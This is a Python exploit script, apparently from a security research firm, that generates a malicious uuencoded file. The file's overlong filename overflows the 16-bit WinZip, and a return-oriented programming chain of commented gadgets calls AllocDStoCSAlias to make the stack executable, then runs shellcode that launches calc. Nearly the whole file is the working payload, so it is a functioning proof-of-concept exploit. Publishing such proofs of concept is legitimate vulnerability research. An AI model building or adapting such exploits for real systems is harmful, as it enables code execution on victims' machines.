#!/usr/bin/python2.7
# uuebuf.py
# Generates malicious uuencoded file with overflow in filename, to trigger
# overflow in 16-bit version of WinZip and delivers CALC shellcode.
#
# Copyright (c) 2018, Independent Security Evaluators LLC
# All rights reserved.
# 
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions
# are met:
# 
# * Redistributions of source code must retain the above copyright
#   notice, this list of conditions and the following disclaimer.
# 
# * Redistributions in binary form must reproduce the above copyright
#   notice, this list of conditions and the following disclaimer in
#   the documentation and/or other materials provided with the
#   distribution.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
# "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
# LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS
# FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
# COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
# INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
# BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
# CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
# LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
# ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.
# note: output to EXPLOIT1.UUE
# the filename MUST be exactly 8 characters long + ext

print "begin 644",

print ("0123" +
       # initial BP
       "\xca\x8a" +
       # gadget 1
       # MOV AX, SS
       # MOV ES, AX
       # MOV DS, AX
       # RETF
       "\x8d\x80\x7f\x04" +
       # gadget 2
       # MOV WORD PTR [BP+0E],AX
       # RET
       "\x71\x5f\x17\x01" +
       # gadget 3
       # RETF
       "\x21\xa8" +
       # gadget 4
       # POP AX
       # POP BX
       # POP CX
       # POP DX
       # POP ES
       "\xce\x4b\x7f\x04" +
       # workaround null byte to call
       # AllocDStoCSAlias (0117:00E4)
       # AX=0x0117
       # BX=0x00e4|0x0100
       # CX=0x80ff
       # DX=don't care (DX ascii)
       # ES=any valid selector (code seg for USER)
       "\x17\x01\xe4\x01\xff\x80XD\x7f\x04"
       # gadget 5
       # AND BX,CX
       # OR WORD PTR ES:[0042],BX
       # RETF
       "\x14\x50\x7f\x04" +
       # gadget 6
       # PUSH AX
       # PUSH BX
       # XOR AX,AX
       # CWD
       # XOR CX,CX
       # MOV ES,AX
       # RETF
       "\xc9\x94\x17\x01" +
       # gadget 7
       # POP BX
       # POP CX
       # POP DX
       # POP ES
       # RETF
       "\xcf\x4b\x7f\x04" +
       # placeholder for arg to AllocDStoCSAlias
       "SS" +
       # BX=hardcoded stack offset of shellcode
       # CX=don't care (CX ascii)
       # DX=don't care (DX ascii)
       # ES=any valid selector (code seg for USER)
       "\xe6\x8aXCXD\x7f\x04"
       # gadget 8 - see gadget 6
       "\xc9\x94\x17\x01" +
       "\x31\xc0\x50\x68\x6c\x63\x68\x63\x61\x89" +
       "\xe0\x16\x50\x6a\x05\x9a\x8f\x02\x1f\x01" +
       # filler
       "iijjkkllmmnnooppqqrrssttuuvvwwxxyyzz00112233445566778899AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz" + "_" * 31)

print """%=&5S=`H`
`
end"""
